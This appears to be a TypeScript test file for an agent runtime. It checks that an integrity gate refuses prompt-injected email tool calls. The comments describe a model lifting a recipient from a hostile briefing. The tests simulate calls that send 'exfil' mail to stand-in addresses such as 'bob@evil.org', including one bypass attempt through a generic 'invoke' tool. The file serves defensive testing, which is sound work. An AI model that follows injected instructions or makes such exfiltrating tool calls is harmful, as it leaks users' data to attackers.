import { describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";
import { Identity } from "@commonfabric/identity";
import { StorageManager } from "@commonfabric/runner/storage/cache.deno";
import { enableMockMode } from "@commonfabric/llm/client";
import type { JSONSchema } from "@commonfabric/api";
import { createTrustedBuilder } from "./support/trusted-builder.ts";
import { Runtime } from "../src/runtime.ts";
import type { CfcEnforcementMode } from "../src/cfc/types.ts";
import { createLLMFriendlyLink } from "../src/link-types.ts";
import { llmToolExecutionHelpers } from "../src/builtins/llm-dialog.ts";

const signer = await Identity.fromPassphrase("cfc agent tool-input integrity");
const space = signer.did();
enableMockMode();

// Epic D2 (docs/specs/cfc-trusted-agent-tool-integrity.md piece A/C): the CFC
// agent prompt-injection demo's central claim is structural. A routing field
// (`sendMail.recipient`) declares `ifc.requiredIntegrity: [agent-kernel]`, so a
// recipient the model lifted out of a hostile briefing — a plain model-output
// string carrying none of that integrity — must be REFUSED by the runtime
// before the handler runs (spec §13.6 / demos/01-agent-prompt-injection.md).
// The dialog tool path now validates each model-supplied input field against
// its inputSchema's requiredIntegrity at invoke time.

const KERNEL_ATOM = {
  type: "https://commonfabric.org/cfc/atom/Builtin",
  name: "agent-kernel-demo-v1",
} as const;

// A sendMail tool. `withFloor` toggles the requiredIntegrity floor on
// `recipient` so we can prove the gate fires only for floor-declaring fields.
async function setupSendMail(
  cfcEnforcementMode: CfcEnforcementMode,
  withFloor: boolean,
) {
  const storageManager = StorageManager.emulate({ as: signer });
  const runtime = new Runtime({
    apiUrl: new URL(import.meta.url),
    storageManager,
    cfcEnforcementMode,
  });
  const tx = runtime.edit();
  const { commonfabric } = createTrustedBuilder(runtime);
  const { pattern, handler, Writable } = commonfabric;

  const recipientSchema = withFloor
    ? { type: "string", ifc: { requiredIntegrity: [KERNEL_ATOM] } }
    : { type: "string" };
  const sendMailInputSchema = {
    type: "object",
    properties: {
      recipient: recipientSchema,
      subject: { type: "string" },
      body: { type: "string" },
    },
    required: ["recipient", "subject", "body"],
    additionalProperties: false,
  } as JSONSchema;

  const sendMail = handler<
    { recipient: string; subject: string; body: string },
    { emails: any }
  >(
    {
      type: "object",
      properties: {
        recipient: { type: "string" },
        subject: { type: "string" },
        body: { type: "string" },
      },
      required: ["recipient", "subject", "body"],
      additionalProperties: false,
    },
    {
      type: "object",
      properties: {
        emails: {
          type: "array",
          items: { type: "object", additionalProperties: true },
          asCell: ["cell"],
        },
      },
      required: ["emails"],
    },
    ({ recipient, subject, body }, { emails }) => {
      emails.push({ recipient, subject, body });
    },
  );

  const resultSchema = {
    type: "object",
    properties: {
      emails: {
        type: "array",
        items: { type: "object", additionalProperties: true },
      },
      tools: true,
    },
    required: ["emails", "tools"],
  } as const satisfies JSONSchema;

  const testPattern = pattern(
    () => {
      const emails = Writable.of<
        { recipient: string; subject: string; body: string }[]
      >([]);
      return {
        emails,
        tools: {
          sendMail: {
            description: "Send an email.",
            inputSchema: sendMailInputSchema,
            handler: sendMail({ emails }),
          },
        },
      };
    },
    false,
    resultSchema,
  );

  const resultCell = runtime.getCell(
    space,
    `agent-tool-input-integrity-${cfcEnforcementMode}-${withFloor}`,
    resultSchema,
    tx,
  );
  const result = runtime.run(tx, testPattern, {}, resultCell);
  runtime.prepareTxForCommit(tx);
  await tx.commit();
  await runtime.idle();

  const catalog = llmToolExecutionHelpers.buildToolCatalog(
    result.key("tools") as any,
    false,
  );

  const sendInjected = async () => {
    await llmToolExecutionHelpers.executeToolCalls(runtime, space, catalog, [{
      type: "tool-call",
      toolCallId: "call-injected",
      toolName: "sendMail",
      input: { recipient: "bob@evil.org", subject: "exfil", body: "stuff" },
    }] as any);
    await runtime.idle();
  };

  const injectedWasSent = async () => {
    const emails = (await result.key("emails").pull()) as
      | { recipient: string }[]
      | undefined;
    return (emails ?? []).some((e) => e.recipient === "bob@evil.org");
  };

  const dispose = async () => {
    await runtime.dispose();
    await storageManager.close();
  };

  return { sendInjected, injectedWasSent, dispose };
}

describe("CFC trusted agent: tool-input requiredIntegrity (Epic D2)", () => {
  it("refuses a sendMail whose recipient lacks the required integrity (injected)", async () => {
    const t = await setupSendMail("enforce-explicit", true);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(false);
    } finally {
      await t.dispose();
    }
  });

  it("does not gate tools without a requiredIntegrity floor (no over-block)", async () => {
    // A plain-literal recipient is fine for a field that declares no floor —
    // the gate is opt-in and must not perturb ordinary tools.
    const t = await setupSendMail("enforce-explicit", false);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(true);
    } finally {
      await t.dispose();
    }
  });

  it("does not gate when CFC enforcement is disabled", async () => {
    const t = await setupSendMail("disabled", true);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(true);
    } finally {
      await t.dispose();
    }
  });

  it("observe mode is diagnostic — it does not deny the call", async () => {
    // observe is the dry-run mode: a floor failure must not block the handler.
    const t = await setupSendMail("observe", true);
    try {
      await t.sendInjected();
      expect(await t.injectedWasSent()).toBe(true);
    } finally {
      await t.dispose();
    }
  });

  it("closes the invoke-builtin bypass (a literal routed through invoke is refused)", async () => {
    // Routing through the generic `invoke` builtin must be checked against the
    // RESOLVED handler's argument schema (which carries the floor), not the
    // invoke tool's own path/args schema — otherwise the D2 gate is bypassable.
    const storageManager = StorageManager.emulate({ as: signer });
    const runtime = new Runtime({
      apiUrl: new URL(import.meta.url),
      storageManager,
      cfcEnforcementMode: "enforce-explicit",
    });
    const tx = runtime.edit();
    const { commonfabric } = createTrustedBuilder(runtime);
    const { pattern, handler, Writable } = commonfabric;
    try {
      const sendMail = handler<
        { recipient: string; subject: string; body: string },
        { emails: any }
      >(
        {
          type: "object",
          properties: {
            recipient: {
              type: "string",
              ifc: { requiredIntegrity: [KERNEL_ATOM] },
            },
            subject: { type: "string" },
            body: { type: "string" },
          },
          required: ["recipient", "subject", "body"],
          additionalProperties: false,
        },
        {
          type: "object",
          properties: {
            emails: {
              type: "array",
              items: { type: "object", additionalProperties: true },
              asCell: ["cell"],
            },
          },
          required: ["emails"],
        },
        ({ recipient, subject, body }, { emails }) => {
          emails.push({ recipient, subject, body });
        },
      );
      const resultSchema = {
        type: "object",
        properties: {
          emails: {
            type: "array",
            items: { type: "object", additionalProperties: true },
          },
          sendMail: { asCell: ["stream"] },
        },
        required: ["emails", "sendMail"],
      } as const satisfies JSONSchema;
      const testPattern = pattern(
        () => {
          const emails = Writable.of<
            { recipient: string; subject: string; body: string }[]
          >([]);
          return { emails, sendMail: sendMail({ emails }) };
        },
        false,
        resultSchema,
      );
      const resultCell = runtime.getCell(
        space,
        "agent-invoke-bypass",
        resultSchema,
        tx,
      );
      const result = runtime.run(tx, testPattern, {}, resultCell);
      runtime.prepareTxForCommit(tx);
      await tx.commit();
      await runtime.idle();

      // builtinTools=true → the generic `invoke` tool is available.
      const catalog = llmToolExecutionHelpers.buildToolCatalog(
        result.key("tools") as any,
        true,
      );
      const handlerLink = createLLMFriendlyLink(
        result.key("sendMail").getAsNormalizedFullLink(),
        space,
      );
      await llmToolExecutionHelpers.executeToolCalls(runtime, space, catalog, [{
        type: "tool-call",
        toolCallId: "call-invoke-bypass",
        toolName: "invoke",
        input: {
          path: handlerLink,
          args: { recipient: "bob@evil.org", subject: "x", body: "y" },
        },
      }] as any);
      await runtime.idle();

      const emails = (await result.key("emails").pull()) as
        | { recipient: string }[]
        | undefined;
      expect(
        (emails ?? []).some((e) => e.recipient === "bob@evil.org"),
      ).toBe(false);
    } finally {
      await runtime.dispose();
      await storageManager.close();
    }
  });

  it("descends into array-items floors", async () => {
    // A floor under `items` must gate every model-supplied element.
    const storageManager = StorageManager.emulate({ as: signer });
    const runtime = new Runtime({
      apiUrl: new URL(import.meta.url),
      storageManager,
      cfcEnforcementMode: "enforce-explicit",
    });
    const tx = runtime.edit();
    const { commonfabric } = createTrustedBuilder(runtime);
    const { pattern, handler, Writable } = commonfabric;
    try {
      const broadcast = handler<{ recipients: string[] }, { sent: any }>(
        {
          type: "object",
          properties: {
            recipients: {
              type: "array",
              items: {
                type: "string",
                ifc: { requiredIntegrity: [KERNEL_ATOM] },
              },
            },
          },
          required: ["recipients"],
          additionalProperties: false,
        },
        {
          type: "object",
          properties: {
            sent: {
              type: "array",
              items: { type: "string" },
              asCell: ["cell"],
            },
          },
          required: ["sent"],
        },
        ({ recipients }, { sent }) => {
          for (const r of recipients) sent.push(r);
        },
      );
      const resultSchema = {
        type: "object",
        properties: {
          sent: { type: "array", items: { type: "string" } },
          tools: true,
        },
        required: ["sent", "tools"],
      } as const satisfies JSONSchema;
      const testPattern = pattern(
        () => {
          const sent = Writable.of<string[]>([]);
          return {
            sent,
            tools: {
              broadcast: {
                description: "Broadcast.",
                inputSchema: {
                  type: "object",
                  properties: {
                    recipients: {
                      type: "array",
                      items: {
                        type: "string",
                        ifc: { requiredIntegrity: [KERNEL_ATOM] },
                      },
                    },
                  },
                  required: ["recipients"],
                  additionalProperties: false,
                },
                handler: broadcast({ sent }),
              },
            },
          };
        },
        false,
        resultSchema,
      );
      const resultCell = runtime.getCell(
        space,
        "agent-items-floor",
        resultSchema,
        tx,
      );
      const result = runtime.run(tx, testPattern, {}, resultCell);
      runtime.prepareTxForCommit(tx);
      await tx.commit();
      await runtime.idle();

      const catalog = llmToolExecutionHelpers.buildToolCatalog(
        result.key("tools") as any,
        false,
      );
      await llmToolExecutionHelpers.executeToolCalls(runtime, space, catalog, [{
        type: "tool-call",
        toolCallId: "call-items",
        toolName: "broadcast",
        input: { recipients: ["evil@x.org"] },
      }] as any);
      await runtime.idle();

      const sent = (await result.key("sent").pull()) as string[] | undefined;
      expect((sent ?? []).includes("evil@x.org")).toBe(false);
    } finally {
      await runtime.dispose();
      await storageManager.close();
    }
  });
});
